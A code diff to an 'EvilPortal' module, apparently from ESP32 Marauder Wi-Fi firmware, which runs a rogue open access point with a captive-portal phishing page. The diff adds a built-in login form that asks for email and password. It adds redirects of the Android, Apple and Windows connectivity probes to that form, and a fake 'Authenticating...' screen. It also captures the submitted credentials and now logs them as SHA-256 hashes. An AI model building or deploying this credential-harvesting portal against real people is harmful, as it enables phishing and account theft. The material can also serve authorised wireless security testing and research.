@@ -1,8 +1,15 @@
 #include "EvilPortal.h"
+#include "mbedtls/sha256.h"
 
-AsyncWebServer server(80);
+WebServer server(80);
+
+char apName[MAX_AP_NAME_SIZE] = "PORTAL";
+char index_html[MAX_HTML_SIZE] = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'></head><body><h1>DIAGNOSTIC PORTAL</h1><p>If you see this, the Web Server is <b>ALIVE</b>.</p><hr><form action='/get' method='GET'>Email: <input type='text' name='email' required><br>Pass: <input type='password' name='password' required><br><button type='submit'>SUBMIT TEST</button></form></body></html>";
+
+extern "C" int ets_printf(const char *fmt, ...);
 
 EvilPortal::EvilPortal() {
+  ets_printf("[CONSTRUCTOR] EvilPortal\n");
 }
 
 void EvilPortal::setup() {
@@ -26,12 +33,18 @@ void EvilPortal::setup() {
 }
 
 bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
-  if (!this->setAP(ssids, access_points))
+  Serial.println("[EP] Starting begin()...");
+  if (!this->setAP(ssids, access_points)) {
+    Serial.println("[EP] setAP failed");
     return false;
-  if (!this->setHtml())
+  }
+  if (!this->setHtml()) {
+    Serial.println("[EP] setHtml failed");
     return false;
+  }
     
-  startPortal();
+  Serial.println("[EP] Calling startPortal()...");
+  this->startPortal(ssids, access_points);
 
   return true;
 }
@@ -45,35 +58,55 @@ String EvilPortal::get_password() {
 }
 
 void EvilPortal::setupServer() {
-  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", index_html);
-    Serial.println("client connected");
+  server.on("/", [this]() {
+    ets_printf("[EP] Route / hit\n");
+    server.send_P(200, "text/html", index_html);
+    ets_printf("[EP] html sent to client\n");
     #ifdef HAS_SCREEN
       this->sendToDisplay("Client connected to server");
     #endif
   });
 
-  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
-    String inputMessage;
-    String inputParam;
+  // Captive Portal Probes (Redirection to /)
+  server.on("/generate_204", [this]() { ets_printf("[EP] Probe /generate_204\n"); server.sendHeader("Location", "/", true); server.send(302, "text/plain", ""); }); // Android
+  server.on("/hotspot-detect.html", [this]() { ets_printf("[EP] Probe /hotspot-detect.html\n"); server.sendHeader("Location", "/", true); server.send(302, "text/plain", ""); }); // Apple
+  server.on("/library/test/success.html", [this]() { ets_printf("[EP] Probe /success.html\n"); server.sendHeader("Location", "/", true); server.send(302, "text/plain", ""); }); // Apple
+  server.on("/ncsi.txt", [this]() { ets_printf("[EP] Probe /ncsi.txt\n"); server.sendHeader("Location", "/", true); server.send(302, "text/plain", ""); }); // Windows
+  server.on("/success.txt", [this]() { ets_printf("[EP] Probe /success.txt\n"); server.send(200, "text/plain", "success"); }); // Windows probe
 
-    if (request->hasParam("email")) {
-      inputMessage = request->getParam("email")->value();
-      inputParam = "email";
-      this->user_name = inputMessage;
-      this->name_received = true;
+  server.on("/get", [this]() {
+    ets_printf("[EP] Route /get hit\n");
+    if (server.hasArg("email")) {
+      user_name = server.arg("email");
+      name_received = true;
     }
 
-    if (request->hasParam("password")) {
-      inputMessage = request->getParam("password")->value();
-      inputParam = "password";
-      this->password = inputMessage;
-      this->password_received = true;
+    if (server.hasArg("password")) {
+      password = server.arg("password");
+      password_received = true;
     }
-    request->send(
-      200, "text/html",
-      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
+
+    if (name_received && password_received) {
+      String hashed_user = this->getSHA256(user_name);
+      String hashed_pass = this->getSHA256(password);
+      
+      ets_printf("[EP] CREDENTIALS CAPTURED (HASHED):\n");
+      ets_printf("[EP] User Hash: %s\n", hashed_user.c_str());
+      ets_printf("[EP] Pass Hash: %s\n", hashed_pass.c_str());
+      
+      #ifdef HAS_SCREEN
+        this->sendToDisplay("Credentials Captured (Hashed)");
+      #endif
+    }
+    
+    server.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{font-family:sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;text-align:center}.loader{border:8px solid #f3f3f3;border-top:8px solid #1a73e8;border-radius:50%;width:50px;height:50px;animation:spin 2s linear infinite;margin:20px auto}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class='card'><h2>Authenticating...</h2><div class='loader'></div><p>Please wait while we verify your credentials and connect you to the network.</p></div></body></html>");
   });
+
+  server.onNotFound([this]() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/plain", "");
+  });
+
   Serial.println("web server up");
 }
 
@@ -98,12 +131,9 @@ bool EvilPortal::setHtml() {
     File html_file;
   #endif
   if (!html_file) {
-    #ifdef HAS_SCREEN
-      this->sendToDisplay("Could not find /" + this->target_html_name);
-      this->sendToDisplay("Touch to exit...");
-    #endif
-    Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
-    return false;
+    ets_printf("[EP] Could NOT find /%s. Using default internal HTML.\n", this->target_html_name.c_str());
+    this->has_html = true;
+    return true;
   }
   else {
     if (html_file.size() > MAX_HTML_SIZE) {
@@ -121,7 +151,8 @@ bool EvilPortal::setHtml() {
       if (isPrintable(c))
         html.concat(c);
     }
-    strncpy(index_html, html.c_str(), strlen(html.c_str()));
+    strncpy(index_html, html.c_str(), MAX_HTML_SIZE);
+    index_html[MAX_HTML_SIZE - 1] = '\0'; // Ensure null-termination
     this->has_html = true;
     Serial.println("html set");
     html_file.close();
@@ -150,12 +181,8 @@ bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_
     #endif
     // Could not open config file. return false
     if (!ap_config_file) {
-      #ifdef HAS_SCREEN
-        this->sendToDisplay("Could not find /ap.config.txt.");
-        this->sendToDisplay("Touch to exit...");
-      #endif
-      Serial.println("Could not find /ap.config.txt. Use stopscan...");
-      return false;
+      Serial.println("Could not find /ap.config.txt. Using default AP name: " + (String)apName);
+      ap_config = apName;
     }
     // Config file good. Proceed
     else {
@@ -261,18 +288,94 @@ void EvilPortal::startAP() {
   this->setupServer();
 
   this->dnsServer.start(53, "*", WiFi.softAPIP());
-  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
   server.begin();
   #ifdef HAS_SCREEN
     this->sendToDisplay("Evil Portal READY");
   #endif
 }
 
-void EvilPortal::startPortal() {
-  // wait for flipper input to get config index
-  this->startAP();
+void EvilPortal::startPortal(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
+  const IPAddress AP_IP(192, 168, 4, 1);
+  const IPAddress AP_NET(255, 255, 255, 0);
 
+  Serial.println("[EP] Configuring SoftAP...");
+
+  #ifdef MARAUDER_FLIPPER_C5
+    WiFi.setTxPower(WIFI_POWER_8_5dBm);
+    ets_printf("[EP] TX Power reduced to 8.5dBm\n");
+  #endif
+
+  ets_printf("[EP] Free Heap before AP start: %u\n", ESP.getFreeHeap());
+
+  // Robust initialization sequence: Disconnect -> Mode -> Config -> Start
+  WiFi.disconnect(true);
+  delay(200);
+
+  // Using AP_STA for better dual-interface stability on C5/S3
+  WiFi.mode(WIFI_AP_STA);
+  ets_printf("[EP] WiFi Mode set (AP_STA). Waiting 1s for radio...\n");
+  delay(1000); 
+
+  // Simplified config for C5 stability (Defaulting to 192.168.4.1)
+  // if (!WiFi.softAPConfig(AP_IP, AP_IP, AP_NET)) {
+  //   ets_printf("[EP] ERROR: softAPConfig failed!\n");
+  // }
+  
+  // Use the channel from the first target if available, default to 1
+  int ep_channel = 1;
+  if (ssids != nullptr && ssids->size() > 0)
+    ep_channel = ssids->get(0).channel;
+  
+  ets_printf("[EP] Attempting WiFi.softAP on channel %d...\n", ep_channel);
+  bool success = WiFi.softAP(apName, "", ep_channel);
+  
+  if (success) {
+    ets_printf("[EP] SoftAP success: %s\n", apName);
+    ets_printf("[EP] AP IP Address: %s\n", WiFi.softAPIP().toString().c_str());
+  } else {
+    ets_printf("[EP] ERROR: SoftAP failed to start.\n");
+    return;
+  }
+
+  #ifdef MARAUDER_FLIPPER_C5
+    WiFi.setTxPower(WIFI_POWER_8_5dBm);
+    ets_printf("[EP] C5 TX Power stabilized at 8.5dBm\n");
+  #endif
+
+  // Diagnostic WiFi Events
+  WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info){
+    if (event == ARDUINO_EVENT_WIFI_AP_STACONNECTED) {
+      ets_printf("[EP] CLIENT CONNECTED!\n");
+    } else if (event == ARDUINO_EVENT_WIFI_AP_STADISCONNECTED) {
+      ets_printf("[EP] CLIENT DISCONNECTED!\n");
+    }
+  });
+
+  ets_printf("[EP] Starting DNS Server...\n");
+  dnsServer.start(53, "*", WiFi.softAPIP());
+  ets_printf("[EP] DNS Server up\n");
+
+  this->setupServer();
+  ets_printf("[EP] Server configured. Opening socket...\n");
+
+  server.begin();
   this->runServer = true;
+  this->has_ap = true;
+  ets_printf("[EP] PORTAL READY AND LISTENING\n");
+  Serial.println("[EP] Web Server started. Manual IP: 192.168.4.1");
+}
+
+String EvilPortal::getSHA256(String data) {
+  unsigned char hash[32];
+  mbedtls_sha256((const unsigned char*)data.c_str(), data.length(), hash, 0);
+  
+  String hashStr = "";
+  for (int i = 0; i < 32; i++) {
+    char hex[3];
+    sprintf(hex, "%02x", hash[i]);
+    hashStr += hex;
+  }
+  return hashStr;
 }
 
 void EvilPortal::sendToDisplay(String msg) {
@@ -291,19 +394,35 @@ void EvilPortal::sendToDisplay(String msg) {
 }
 
 void EvilPortal::main(uint8_t scan_mode) {
+  // Heartbeat every 1000ms - MOVED OUTSIDE FOR DEEP DIAGNOSTIC
+  static uint32_t last_diagnostic = 0;
+  if (millis() - last_diagnostic > 1000) {
+    ets_printf("\n[EP-DEBUG] Mode: %u, AP: %d, HTML: %d, RAM: %u\n", 
+                  scan_mode, this->has_ap, this->has_html, ESP.getFreeHeap());
+    last_diagnostic = millis();
+  }
+
   if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && (this->has_ap) && (this->has_html)){
     this->dnsServer.processNextRequest();
+    server.handleClient();
+    
     if (this->name_received && this->password_received) {
       this->name_received = false;
       this->password_received = false;
-      String logValue1 =
-          "u: " + this->user_name;
-      String logValue2 = "p: " + this->password;
+      
+      String hashed_user = this->getSHA256(this->user_name);
+      String hashed_pass = this->getSHA256(this->password);
+      
+      String logValue1 = "u: " + hashed_user;
+      String logValue2 = "p: " + hashed_pass;
       String full_string = logValue1 + " " + logValue2 + "\n";
+      
+      ets_printf("[EP] RECORDING HASHED CREDENTIALS...\n");
       Serial.print(full_string);
       buffer_obj.append(full_string);
+      
       #ifdef HAS_SCREEN
-        this->sendToDisplay(full_string);
+        this->sendToDisplay("Data Hashed & Saved");
       #endif
     }
   }
